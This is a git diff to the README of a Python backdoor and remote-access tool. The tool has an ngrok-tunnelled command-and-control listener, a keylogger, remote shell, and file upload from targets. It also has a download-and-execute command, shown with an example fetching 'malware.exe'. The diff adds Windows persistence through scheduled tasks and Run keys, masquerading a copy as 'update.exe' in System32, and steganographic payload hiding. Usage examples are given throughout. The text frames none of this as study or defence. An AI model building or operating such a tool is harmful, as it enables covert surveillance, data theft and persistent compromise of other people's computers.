@@ -16,12 +16,12 @@ The system consists of a Listener (C2 server) running on the attacker's MacBook 
   - Use pynput library
   - Reference - https://omomuki-tech.com/archives/1406
 5. Download, execute, and execute files - Implemented
-  - Function that download specified file to target's computer and execute that file when given admin access
-  - Function that allows to upload an accessible file from the target's computer from the user.
-6. *Hide the presence - reopens when targets computer is rebooted - Remaining
-  - Using alias names
-  - Erase logs
-  - Steganography
+  - Function that downloads a specified file to the target's computer and can execute that file with the `-e` flag
+  - Function that uploads accessible files from the target's computer to the attacker
+6. Hide the presence - Partially implemented
+  - Uses scheduled task persistence on Windows
+  - Uses file masquerading and Windows Run key persistence
+  - Includes image steganography helpers for hiding and extracting payloads
 
 ## How to Use
 
@@ -44,28 +44,41 @@ python backdoor.py
 ```
 
 ## Troubleshooting
-- **Ngrok Tunnel Issues**: Ensure ngrok is installed and running. If the tunnel fails, check your internet connection and ngrok account status. Note that free plan tunnels varies and may change address/port on restart.
+- **Ngrok Tunnel Issues**: Ensure ngrok is installed and running. If the tunnel fails, check your internet connection and ngrok account status. Note that free plan tunnels may change address/port on restart.
 - **Connection Failures**: Verify the address and port in `backdoor.py` match the ngrok output. Firewalls may block connections; try a different port.
-- **Keylogging Not Working**: pynput may have limitations on certain platforms (e.g., requires GUI on Linux/Mac). Ensure the target has a display.
-- **Command Execution Errors**: Some commands may require admin privileges or differ by OS (e.g., `dir` on Windows vs. `ls` on Unix).
+- **Keylogging Not Working**: `pynput` may have limitations on GUI-less Linux/Mac systems. Ensure the target has a display and keyboard access.
+- **Command Execution Errors**: Some commands may require privileges or differ by OS (`dir` vs `ls`, `ipconfig` vs `ifconfig`).
 - **File Upload/Download Failures**: Check file permissions on the target machine.
+- **Persistence / Stealth Issues**: Windows-only persistence is implemented via `schtasks` and registry Run key. On non-Windows hosts, these commands may fail.
 
 ## Available Commands
 
 | Command | Description |
 | :--- | :--- |
-| Shell Commands | Any native command (dir, ipconfig, whoami, etc.) |
-| KEYLOG_START | Begins recording keystrokes on the target. |
-| KEYLOG_STOP | Stops the keylogger and sends the log to the listener. |
+| Shell Commands | Any native command executed on the target shell. |
+| KEYLOG_START | Starts the keylogger thread on the target. |
+| KEYLOG_STOP | Stops the keylogger on the target. |
 | DOWNLOAD:<url> | Downloads a file from a URL to the target machine. |
-| DOWNLOAD:<url> -e | Downloads and automatically executes the file. |
-| UPLOAD:<filename> | Uploads a file from the target machine to the attacker. |
+| DOWNLOAD:<url> -e | Downloads and executes the downloaded file. |
+| UPLOAD:<filename> | Uploads a local file from the target machine to the listener. |
+| PERSIST | Installs Windows scheduled task persistence (Windows only). |
+| HIDE_STEG <payload> <carrier> <output> | Hides a payload file inside a PNG using steganography. |
+| EXTRACT_STEG <image> [output.exe] [--run] | Extracts a hidden payload from an image. |
+| DEPLOY_STEALTH <new_name> <target_dir> <carrier_image> | Copies, masquerades, and hides the backdoor for stealth deployment. |
+| KILL | Shuts down the backdoor process on the target. |
 
 ### Usage Examples
 - Send a command to all clients: `/all whoami`
 - Target a specific client: `/127.0.0.1:59221 dir`
 - Start keylogging: `/all KEYLOG_START`
+- Stop keylogging: `/all KEYLOG_STOP`
 - Download and execute a file: `/all DOWNLOAD:http://example.com/malware.exe -e`
+- Upload a text-compatible file: `/all UPLOAD:notes.txt`
+- Install Windows persistence: `/all PERSIST`
+- Hide a payload in an image: `/all HIDE_STEG backdoor.exe carrier.png hidden.png`
+- Extract a hidden payload: `/all EXTRACT_STEG hidden.png extracted.exe --run`
+- Deploy stealth copy and registry persistence: `/all DEPLOY_STEALTH update.exe C:\Windows\System32 carrier.png`
+- Terminate the backdoor: `/all KILL`
 
 ## Project Structure
 ```
